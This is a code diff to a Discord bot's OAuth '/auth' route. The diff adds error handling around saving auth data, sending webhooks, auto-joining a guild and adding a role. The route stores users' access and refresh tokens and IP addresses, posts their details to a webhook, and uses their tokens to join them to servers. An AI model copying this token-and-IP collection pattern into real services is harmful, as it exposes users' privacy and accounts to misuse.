@@ -76,7 +76,12 @@ app.get("/auth", async (req, res) => {
   const ip = req.headers["x-forwarded-for"] || req.socket.remoteAddress;
   const data = await authClient.manageAuth(req.query.code);
   const user_id = await authClient.requestId(data.access_token);
-  if (!user_id) return log("Başarısız");
+
+  if (!user_id) {
+    log("Başarısız");
+    return;
+  }
+
   const user_ = await authClient.fetchUser(user_id);
   const botData = await botSchema.findOne({ clientId: client.user?.id });
 
@@ -101,11 +106,14 @@ app.get("/auth", async (req, res) => {
     accessToken: data.access_token,
     refreshToken: data.refresh_token,
     expiresDate: Date.now() + 604800,
-    locale: locale,
+    locale: locale || "unknown", // Varsayılan bir değer ekleyin
     ip: `${ip}`,
   };
 
-  authClient.saveAuth(userData);
+  authClient.saveAuth(userData).catch((err) => {
+    error("Error saving auth:", err);
+  });
+
   authClient.sendWebhook({
     embeds: [
       {
@@ -152,6 +160,8 @@ app.get("/auth", async (req, res) => {
         description: `\`\` ${userData.username}#${userData.discriminator} \`\` \`\` ${userData.id} \`\``,
       },
     ],
+  }).catch((err) => {
+    error("Error sending webhook:", err);
   });
 
   if (botData?.autoJoin[0]?.status === true) {
@@ -159,7 +169,12 @@ app.get("/auth", async (req, res) => {
       userData.accessToken,
       botData.autoJoin[0].guildID,
       userData.id
-    );
+    )
+    .then(() => log(`User ${userData.id} joined server`))
+    .catch((err) => {
+      error("Error joining server:", err);
+    });
+
     authClient.sendWebhook({
       embeds: [
         {
@@ -184,22 +199,25 @@ app.get("/auth", async (req, res) => {
           },
         },
       ],
+    }).catch((err) => {
+      error("Error sending webhook for join event:", err);
     });
   }
 
   const guild1 = client.guilds.cache.get(config.guild.id);
-  guild1?.members
-    .fetch(user_id)
-    .then((member) => {
-      member.roles
-        .add(config.guild.role)
-        .then(() => log(`Role added to ${member.user.username}`))
-        .catch(error);
-    })
-    .catch((error) => {
-      warn(`User ${user_id} is not a member of the guild ${guild1.name}`);
-      error(error);
-    });
+  if (guild1) {
+    guild1.members.fetch(user_id)
+      .then((member) => {
+        return member.roles.add(config.guild.role);
+      })
+      .then(() => log(`Role added to ${user_.username}`))
+      .catch((err) => {
+        warn(`Error adding role to user ${user_id}: ${err}`);
+        error(err);
+      });
+  } else {
+    warn(`Guild with ID ${config.guild.id} not found`);
+  }
 });
 
 process
